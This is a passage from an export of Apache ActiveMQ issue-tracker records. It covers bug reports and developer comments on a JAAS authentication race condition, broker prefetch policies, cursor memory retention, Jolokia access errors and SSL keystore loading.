;;;","14/Jan/13 23:17;tabish;I just added a call to broker.waitUntilStopped() to trunk.  Its a bit tricky because those ports need to be freed and back into a reusable state.  ;;;","15/Jan/13 20:18;tabish;The issue seems to be that the WebappContext created for the Webconsole isn't getting shutdown all the time or at least not in a timely fashion when the broker is stopped.  Haven't found a simple way to enforce that from the unit test.  ;;;","15/Jan/13 21:27;kearls;I *think* I've found the problem.  activemq-stomp.xml did not have a shutdown hook for Jetty.  I'll attach a patch.
;;;","15/Jan/13 21:28;kearls;Adds a shutdown hook for jetty to activemq-stomp.xml
;;;","15/Jan/13 21:54;tabish;Yep, that's probably it.  Patch applied, thanks!;;;","15/Jan/13 22:06;tabish;Fixed now on both my test platforms, was failing on both previously. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Race condition in PropertiesLoginModule,AMQ-4249,12627290,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,lothor,lothor,12/Jan/13 00:51,14/Jan/13 21:52,14/Jul/23 05:43,14/Jan/13 21:52,5.5.1,5.6.0,5.7.0,5.8.0,,5.8.0,,,Broker,,,,0,Authentication,JAAS,Security,,,,,,"h1. Problem

While setting up a connection pool towards ActiveMq 5.5.1 using Bitronix 2.1.3 I've been having some issues related to authentication and authorization of the JMS connections.

When doing a clean restart of the JMS-clients JVM the connection pool has been unable to connect successfully with one or more of the 14 connections it's been set up to use.

The error messages I've been getting has usually been one of the following two:

# User system is not authorized to read from: ActiveMQ.Advisory.TempQueue,ActiveMQ.Advisory.TempTopic
# User name or password is invalid.

The broker has been set up using a very simplistic configuration:
{code:xml}
<?xml version=""1.0"" encoding=""UTF-8""?>
<beans xmlns=""http://www.springframework.org/schema/beans""
	xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:context=""http://www.springframework.org/schema/context""

	xsi:schemaLocation=""http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core-5.5.0.xsd
		http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
		http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd"">
	<context:property-placeholder />

	<broker brokerId=""localhost"" xmlns=""http://activemq.apache.org/schema/core""
		dataDirectory=""${datadir}"" start=""false"">
		<managementContext>
			<managementContext connectorHost=""0.0.0.0""
				connectorPort=""14522"" createConnector=""true"" />
		</managementContext>
		<plugins>
			<jaasAuthenticationPlugin configuration=""activemq-domain""
				discoverLoginConfig=""true"" />
			<authorizationPlugin>
				<map>
					<authorizationMap>
						<authorizationEntries>
							<authorizationEntry queue="">"" read=""admins""
								write=""admins"" admin=""admins"" />

							<authorizationEntry topic="">"" read=""admins""
								write=""admins"" admin=""admins"" />

							<authorizationEntry topic=""ActiveMQ.Advisory.>""
								read=""guests,users"" write=""guests,users"" admin=""guests,users"" />
						</authorizationEntries>
					</authorizationMap>
				</map>
			</authorizationPlugin>
		</plugins>
		<transportConnectors>
			<transportConnector id=""openwire"" uri=""tcp://0.0.0.0:61616?trace=true"" />
		</transportConnectors>
	</broker>
</beans>
{code}

The JAAS-configuration has been verified to match username and password used by the client when connecting (username = system):

h4. login.config

{code}
activemq-domain {
    org.apache.activemq.jaas.PropertiesLoginModule required
        debug=false
        org.apache.activemq.jaas.properties.user=""users.properties""
        org.apache.activemq.jaas.properties.group=""groups.properties"";
};
{code}

h4.users.properties

{code}
system=manager
user=password
guest=password
{code}

h4. groups.properties
{code}
admins=system
users=user
guests=guest
{code}

h1. Cause

After debugging the problem it seems as if the problem is caused by a race condition introduced in PropertiesLoginModule in revision [1086219|https://fisheye6.atlassian.com/changelog/activemq?showid=1086219] (AMQ-3244). When the reload-support was added the users- and groups-fields were changed into static fields. But no additional synchronization was introduced, thereby introducing a race condition when several threads are entering the initialize- and commit-methods are the same time.

The following section of the initialize-method in PropertiesLoginModule contains the first part of the race condition. Please note the unsynchronized modification of both the users- and groups static fields:

{code:java}
        if (reload || users == null || uf.lastModified() > usersReloadTime) {
            if (debug) {
                LOG.debug(""Reloading users from "" + uf.getAbsolutePath());
            }
            try {
                users = new Properties(); // XXX Here be dragons
                java.io.FileInputStream in = new java.io.FileInputStream(uf);
                users.load(in);
                in.close();
                usersReloadTime = System.currentTimeMillis();
            } catch (IOException ioe) {
                LOG.warn(""Unable to load user properties file "" + uf);
            }
        }

        groupsFile = (String) options.get(GROUP_FILE) + """";
        File gf = baseDir != null ? new File(baseDir, groupsFile) : new File(groupsFile);
        if (reload || groups == null || gf.lastModified() > groupsReloadTime) {
            if (debug) {
                LOG.debug(""Reloading groups from "" + gf.getAbsolutePath());
            }
            try {
                groups = new Properties(); // XXX Here be dragons
                java.io.FileInputStream in = new java.io.FileInputStream(gf);
                groups.load(in);
                in.close();
                groupsReloadTime = System.currentTimeMillis();
            } catch (IOException ioe) {
                LOG.warn(""Unable to load group properties file "" + gf);
            }
        }
{code}

The next part comes in the login-method when the users password is retrieved:

{code:java}
        String password = users.getProperty(user); 
{code}

The final part of the puzzle occurs in the commit-method:
{code:java}
            for (Enumeration<?> enumeration = groups.keys(); enumeration.hasMoreElements();) {
                String name = (String)enumeration.nextElement();
                String[] userList = ((String)groups.getProperty(name) + """").split("","");
                for (int i = 0; i < userList.length; i++) {
                    if (user.equals(userList[i])) {
                        principals.add(new GroupPrincipal(name));
                        break;
                    }
                }
            }
{code}

The retrieval of the user password will fail if invoked by a thread immediately after a different thread has assigned an empty Properties-object to the users field in the initialize-method.

Similarly population of the GroupPrincipals into the Subject in the commit-method will silently fail if executed by a thread immediately after a different thread has assigned an empty Properties-object to the groups-field in the initialize-method.

h1. Proposed solution

I've created a testcase that reproduces the problem and an additional patch that introduces a wrapper around the Properties-objects for the users- and groups-fields.

The testcase and the proposed solution is available via https://github.com/lothor/activemq.","ActiveMQ 5.5.1 with JAAS authentication via PropertiesLoginModule configured, Spring JMS 3.0.5, 64-bit, Intel quad core CPU (i7 950), Windows 7
",lothor,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jan/13 18:01;lothor;AMQ-4249-proposed-fix.diff;https://issues.apache.org/jira/secure/attachment/12564744/AMQ-4249-proposed-fix.diff","14/Jan/13 18:01;lothor;AMQ-4249-testcase.diff;https://issues.apache.org/jira/secure/attachment/12564743/AMQ-4249-testcase.diff",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,304061,,,Mon Jan 14 21:52:14 UTC 2013,,,,,,,Patch Available,,,,"0|i17hx3:",251872,,,,,,,,,,,,,,,,,,,,,"12/Jan/13 01:00;lothor;I've verified that the problem seems to be present both in 5.5.1 and the current trunk (5.8-SNAPSHOT). Based on the SVN history I'm fairly certain it's present in 5.6 and 5.7 as well.;;;","12/Jan/13 12:16;lothor;Simplified the proposed solution a bit by removing the read-write lock and readded the reloadtime-check that was missing in the last changeset.;;;","14/Jan/13 15:54;tabish;You should create and attach patch files for your test case and proposed fix for review. ;;;","14/Jan/13 18:01;lothor;Coming right up. I've attached two patches, one containing the testcase and one containing the proposed fix.;;;","14/Jan/13 21:52;tabish;Nice investigation, patch applied to trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FilePendingMessageCursor can retain memory after flush to disk till next reset via internal iterator,AMQ-4248,12627031,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,10/Jan/13 21:25,18/Jan/13 20:40,14/Jul/23 05:43,18/Jan/13 20:40,5.6.0,,,,,5.8.0,,,Broker,,,,0,cursor,memory,oom,,,,,,"the contract for cursor iteration is to call {code}reset,next...,release{code} 
If the cursor is flushed on add, the memory list is cleared but the iterator is still referencing the list, which causes memory bloat. It will be released on the next call to reset (which may take some time depending on consumer activity), but it should be gone after the previous call to release.
",,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,303724,,,Fri Jan 18 20:40:56 UTC 2013,,,,,,,,,,,"0|i17e27:",251247,,,,,,,,,,,,,,,,,,,,,"11/Jan/13 17:46;tabish;Test failures in Hudson indicate that there's something amiss in the Durable Store cursor that this change exposes. ;;;","11/Jan/13 20:40;tabish;The problem comes from a second attempt to dispatch a the message when the dispatchAsync mode is on and the TransportConnection calls the transmitCallback:

{noformat}
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.reset(FilePendingMessageCursor.java:137)
	at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.reset(StoreDurableSubscriberCursor.java:287)
	at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:627)
	at org.apache.activemq.broker.region.DurableTopicSubscription.dispatchPending(DurableTopicSubscription.java:265)
	at org.apache.activemq.broker.region.PrefetchSubscription.onDispatch(PrefetchSubscription.java:731)
	at org.apache.activemq.broker.region.PrefetchSubscription$3.run(PrefetchSubscription.java:705)
	at org.apache.activemq.broker.TransportConnection.dispatchAsync(TransportConnection.java:816)
	at org.apache.activemq.broker.region.PrefetchSubscription.dispatch(PrefetchSubscription.java:708)
	at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:651)
	at org.apache.activemq.broker.region.DurableTopicSubscription.dispatchPending(DurableTopicSubscription.java:265)
	at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:161)
	at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:259)
	at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:48)
	at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:688)
	at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:499)
	at org.apache.activemq.broker.region.Topic.send(Topic.java:435)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:408)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:392)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:282)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:317)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:448)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:749)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:150)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:278)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:722)

{noformat}

This happens when the transport is stopping but a message was queued for dispatch.  Although I think this would happen from the other calls to the transmitcallback as they all invoke another dispatch cycle from PrefetchSubscription.onDispatch;;;","18/Jan/13 17:38;tabish;This seems to be sorted now if you want to resolve it.;;;","18/Jan/13 20:40;gtully;@Tim thanks.
We may need to revist recursive calls to the cursor on durable sub dispatch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Jolokia error in latest 5.8 snapshot,AMQ-4247,12626343,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,lionel.cons,lionel.cons,07/Jan/13 12:58,10/Jan/13 15:02,14/Jul/23 05:43,10/Jan/13 14:53,,,,,,,,,,,,,0,,,,,,,,,"Using the latest ActiveMQ 5.8 snapshot, I'm getting errors when trying to access /j4p:

HTTP ERROR 503

Problem accessing /j4p/. Reason:

    java.lang.IllegalStateException: Cannot load extractor org.jolokia.converter.json.simplifier.ClassSimplifier defined in jar:file:/usr/activemq/lib/web/jolokia-core-1.0.6.jar!/META-INF/simplifiers-default : java.lang.ClassCastException: org.jolokia.converter.json.simplifier.ClassSimplifier cannot be cast to org.jmx4perl.converter.json.Extractor. Aborting

Is this a known problem? Is there any documentation on how to use and/or configure Jolokia with ActiveMQ?",activemq-5.8-20130105.031543-65,dejanb,lionel.cons,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,302933,,,Thu Jan 10 15:02:00 UTC 2013,,,,,,,,,,,"0|i176mn:",250042,,,,,,,,,,,,,,,,,,,,,"08/Jan/13 09:23;dejanb;Hi Lionel,

I can reproduce this. What are you trying to access at j4p? There's a brief explanation how to access ActiveMQ MBean information using Jolokia here

http://activemq.apache.org/rest.html#REST-RestManagement

For more info on url syntax, take a look at Jolokia manual.



;;;","08/Jan/13 10:11;lionel.cons;Dejan,

Thanks for your reply and the link to some doc.

The error came in fact from an old installation on jmx4perl (agent). I've now cleaned it. The /j4p/ path is because we use a proxy with this path, ActiveMQ is queried with /api/jolokia/.

I can now access JMX information via Jolokia but I still have two problems.

(1) I tried to use ${activemq.conf} in web.xml to specify which access file Jolokia should use but this syntax does not seem to be accepted. Is there a way to put Java property names in web.xml? IMHO, it would make sense to configure Jolokia from files under ${activemq.conf}.

(2) It seems the MBean paths have changed and this kills our Nagios monitoring. For instance, to get the broker version, we have to use:
 - for ActiveMQ 5.5: org.apache.activemq:Type=Broker,BrokerName=<name>
 - for ActiveMQ 5.8: org.apache.activemq:type=Broker,brokerName=<name>
Is this case change intentional?
;;;","08/Jan/13 10:31;lionel.cons;In fact, there is a third problem, linked to MBean names too.

In 5.5, we can see: org.apache.activemq:BrokerName=<name>,Type=Queue,Destination=ActiveMQ.DLQ
But in 5.8: org.apache.activemq:type=Broker,brokerName=<name>,destinationType=Queue,destinationName=ActiveMQ.DLQ

Why do we have type=Broker for a queue?;;;","08/Jan/13 11:14;tabish;The change is intentional, see AMQ-4237.  ;;;","08/Jan/13 16:52;dejanb;As for the (1) I don't know of a way to use system properties in web.xml, but I think you can achieve the same using classpath:, as conf/ folder is in the classpath.;;;","09/Jan/13 07:51;lionel.cons;Dejan, I will investigate further but it seems that conf is not in the classpath. We use the service wrapper and your conf/wrapper.conf contains only:

wrapper.java.classpath.1=%ACTIVEMQ_HOME%/bin/wrapper.jar
wrapper.java.classpath.2=%ACTIVEMQ_HOME%/bin/activemq.jar
;;;","09/Jan/13 10:58;lionel.cons;In fact, even with the Java service wrapper, ${activemq.conf} is indeed in the classpath so a value of ""classpath:foo"" indeed points to ""foo"" under ${activemq.conf}. Thanks!;;;","10/Jan/13 14:53;lionel.cons;With the classpath: prefix trick I can now use Jolokia without problems.

The only thing left is the MBean names changes but this is being tracked/discussed in AMQ-4237.;;;","10/Jan/13 15:02;dejanb;Hi Lionel, thanks for closing the loop.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Change Type of offlineDurableSubscriberTimeout and offlineDurableSubscriberTaskSchedule to long,AMQ-4246,12626325,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,oltoko,oltoko,07/Jan/13 10:28,08/Jan/13 09:51,14/Jul/23 05:43,07/Jan/13 16:19,5.7.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"activemq.xml:

The Broker Attributes offlineDurableSubscriberTimeout and offlineDurableSubscriberTaskSchedule expect Time in Milliseconds.
I tried to enter a Number greater than 2147483647 and get an NumberFormatException because this isn't a Integer anymore.
If this fields expect Time in Milliseconds, they should be long.
","Debian Squeeze
OpenJDK Runtime Environment (IcedTea6 1.8.13) (6b18-1.8.13-0+squeeze2)",oltoko,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,302911,,,Tue Jan 08 09:51:39 UTC 2013,,,,,,,,,,,"0|i176cv:",249998,,,,,,,,,,,,,,,,,,,,,"07/Jan/13 16:19;tabish;fixed on trunk.;;;","08/Jan/13 09:51;oltoko;Works!! Thank you!!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB Log File Clean Up Using MessageDatabase Trace Logging,AMQ-4236,12625012,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jsherman1,jsherman1,21/Dec/12 15:43,21/Dec/12 20:34,14/Jul/23 05:43,21/Dec/12 20:34,5.7.0,,,,,,,,Documentation,,,,0,,,,,,,,,"The documentation on the kahaDB log file cleanup located here [1] has a bug.

[1] http://activemq.apache.org/why-do-kahadb-log-files-remain-after-cleanup.html

The information provided about the output is incorrect describing the following two lines:

TRACE | gc candidates after dest:0:D, [86, 87, 163] | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker
 TRACE | gc candidates after dest:0:E, [86, 87] | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker

This output indicates that dest:0:E has references to db-163.log and not dest:0:D as the current information states.

It might be helpful to explain the output a little bit clearly indicating the list of log files shown is what is available AFTER checking the the destination, as the log output states.  It just might be helpful to clearly point this out.",,jsherman1,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,301548,,,Fri Dec 21 20:34:07 UTC 2012,,,,,,,,,,,"0|i16ulj:",248089,,,,,,,,,,,,,,,,,,,,,"21/Dec/12 20:34;tabish;Updated the page, should show up in an hour or so once the site refreshes.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker configured prefetch values are lost on failover reconnect,AMQ-4235,12624999,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,21/Dec/12 14:35,21/Dec/12 14:45,14/Jul/23 05:43,21/Dec/12 14:45,5.6.0,5.7.0,,,,5.8.0,,,Broker,,,,0,configuration,failover,prefetch,,,,,,"two brokers configured with the following policy:

{code}
 <policyEntry topic=""FOO.>"" topicPrefetch=""10"" />
{code}

My consumer will failover to the other broker, if it is no longer there:

{code}
            ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(user, password, ""failover:tcp://xx:61666,tcp://xx:61667"");
{code}

When this subscription becomes active ( ant consumer -Dsubject=FOO.TEST -Dtopic=true -Dmax=100), I can see in jconsole that prefetch limit is indeed 10. When I kill the  broker on 61666, the consumer failsover to 61667. Unfortunately, the prefetch limit has now changed to 32766. 

If one configures the consumer to set the prefetch limit:

{code}
destination = session.createTopic(subject +""?consumer.prefetchSize=20"");
{code}

It works consistently, but not having control of consumers, it needs to be configurable broker side.
",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4234,,,AMQ-4234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,301535,,,Fri Dec 21 14:45:51 UTC 2012,,,,,,,,,,,"0|i16uin:",248076,,,,,,,,,,,,,,,,,,,,,"21/Dec/12 14:45;gtully;http://svn.apache.org/viewvc?rev=1424936&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker destination policy prefetch value is ignored by stomp consumers,AMQ-4234,12624838,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,gtully,gtully,20/Dec/12 16:05,21/Dec/12 14:45,14/Jul/23 05:43,21/Dec/12 14:43,5.7.0,,,,,5.8.0,,,STOMP,,,,0,default,prefetch,stomp,,,,,,"Introduced in https://issues.apache.org/jira/browse/AMQ-3895

we use a prefetch value of 0 to ensure no dispatch till we get can receipt the sub. But we may need to find a better way.
Such that the prefetch values can be default on the way in and get applied by the broker.

Also, our default values should mirror the broker defaults based on destination and sub type, currently the all default to 1000.",,gtully,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3895,AMQ-4235,,AMQ-4235,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,301346,,,Fri Dec 21 14:45:14 UTC 2012,,,,,,,,,,,"0|i16rtr:",247640,,,,,,,,,,,,,,,,,,,,,"20/Dec/12 16:14;tabish;Need to be careful with a fix of two things that I was seeing while trying to fix that other issue.  You have to find a way to not send the receipt before you really know if the subscribe worked, and you have to ensure that if it did work that the receipt goes ahead of any dispatched messages to the client.  Lots of fun racing events in there. ;;;","21/Dec/12 14:43;gtully;fix in http://svn.apache.org/viewvc?rev=1424936&view=rev;;;","21/Dec/12 14:45;gtully;@Tim, fix was to run prefetch values propagated through consumer control commands via the policyentry. Failover (setting prefetch to 0 and back) suffered the same problem.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQSslConnectionFactory does not allow for regular files to be found unless a valid URL is provided or is located on the classpath,AMQ-4227,12624304,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ccorsi,ccorsi,17/Dec/12 16:07,17/Dec/12 19:01,14/Jul/23 05:43,17/Dec/12 19:01,5.7.0,5.8.0,,,,5.8.0,,,JMS client,,,,0,client,,,,,,,,"The factory class does not allow one to pass a keystore or truststore file name that is not a properly formatted URL string or is located within the classpath.  

The problem is that the getUrlOrResourceAsStream method does not take into account a regular file name.

The patch includes a fix that provides that ability without removing the ability to pass a valid URL string or having the store be located within the client classpath.
",Any,ccorsi,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Dec/12 16:10;ccorsi;client.keystore;https://issues.apache.org/jira/secure/attachment/12561303/client.keystore","17/Dec/12 16:10;ccorsi;server.keystore;https://issues.apache.org/jira/secure/attachment/12561304/server.keystore","17/Dec/12 16:10;ccorsi;ssltruststore.patch;https://issues.apache.org/jira/secure/attachment/12561302/ssltruststore.patch",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,299078,,,Mon Dec 17 19:01:32 UTC 2012,,,,,,,Patch Available,,,,"0|i15yfj:",242878,,,,,,,,,,,,,,,,,,,,,"17/Dec/12 16:10;ccorsi;This patch includes a test that executes all three options that a client can use to import the different stores within a client application.  

It also includes one that tests this against the failover protocol.

Note that I have copied the keystores that part of another one of the activemq modules and have not created any new ones.;;;","17/Dec/12 19:01;tabish;Patch applied, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker destination zero prefetch and RAR endpoint listener are incompatible b/c RAR is starved of messages - log an error to highlight,AMQ-4226,12624277,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,gtully,gtully,17/Dec/12 13:27,02/May/13 02:29,14/Jul/23 05:43,17/Dec/12 13:48,5.7.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"A broker configured zero prefetch will starve the RAR of messages. The consumer is now aware of the zero prefetch and will log an error if it sees a prefetch value of zero.
RAR is push only so it needs to have a prefetch > 0 for normal operation. Setting prefetch to zero broker size is a way of preventing dispatch if necessary.",Resource adapter (RAR),gtully,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4224,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,299049,,,Mon Dec 17 13:48:14 UTC 2012,,,,,,,,,,,"0|i15y93:",242849,,,,,,,,,,,,,,,,,,,,,"17/Dec/12 13:28;gtully;linking to https://issues.apache.org/jira/browse/AMQ-4224 as this provides the feedback loop to the consumer on creation via a consumer control.;;;","17/Dec/12 13:48;gtully;error now logged by the RAR if zero prefetch is in effect. Condition could be by design if a rar consumer needs to be weaned for some reason, hence the use of the log.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Setting queue policy queuePrefetch=0 in broker configuration causes messages to stay in pending state in broker - the messages aren't consumed,AMQ-4224,12624000,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,gtully,gtully,14/Dec/12 15:49,02/May/13 02:29,14/Jul/23 05:43,17/Dec/12 13:46,5.7.0,,,,,5.8.0,,,Broker,JMS client,,,0,configuration,jms,prefetch,prefetch_size,pull,,,,"Broker prefetch config {code}<policyEntry queue=""XX"" ... queuePrefetch=""0"">{code} takes effect if the consumerInfo contains the default  value (1000), indicating that it does not have a preference.
